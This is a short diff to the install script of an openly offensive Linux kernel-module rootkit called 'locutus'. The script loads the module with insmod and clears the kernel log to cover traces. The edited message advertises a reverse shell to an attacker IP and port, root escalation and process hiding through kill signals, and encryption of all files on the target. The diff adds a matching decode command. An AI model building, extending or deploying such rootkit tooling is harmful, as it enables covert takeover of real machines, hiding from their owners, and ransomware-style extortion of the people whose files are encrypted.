@@ -17,4 +17,4 @@ mv locutus.ko borg_locutus.ko &&
 sudo insmod borg_locutus.ko && # insert lkm
 dmesg --clear &&# clear log
 
-echo -ne "locutus succesfully installed! \nget a reverse shell by running borg_locutus/trigger.sh <target ip> <attacker ip> <attacker port>\nget root by using kill -64 $$\nhide a process by using kill -63 pid\nencode all files on the target with kill -62 $RANDOM\nThe folder name is now borg_d3monized! \n"
+echo -ne "locutus succesfully installed! \nget a reverse shell by running borg_locutus/trigger.sh <target ip> <attacker ip> <attacker port>\nget root by using kill -64 $$\nhide a process by using kill -63 pid\nencode all files on the target with kill -62 $RANDOM\ndecode all files on the target with kill -61 $RANDOM\nThe folder name is now borg_d3monized! \n"
